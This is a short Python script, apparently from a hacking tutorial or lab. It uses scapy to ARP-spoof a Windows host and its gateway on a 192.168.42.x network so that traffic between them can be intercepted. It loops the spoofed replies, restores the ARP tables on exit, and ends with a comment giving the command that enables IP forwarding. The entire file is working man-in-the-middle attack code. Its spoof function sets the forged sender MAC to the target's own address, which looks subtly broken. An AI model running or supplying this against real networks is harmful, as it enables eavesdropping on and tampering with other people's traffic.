#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether

import sys
import time


def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(_target_ip, spoof_ip):
    target_mac = get_mac(_target_ip)
    packet = ARP(op=2, pdst=_target_ip, hwsrc=target_mac, psrc=spoof_ip)
    scapy.send(packet)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# Windows machine
target_ip = "192.168.42.143"
# Router
gateway_ip = "192.168.42.2"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ..... Resetting ARP tables...Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

# Gateway IP: 192.168.42.2
# Target Windows machine: 192.168.42.143
# Packets Forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward


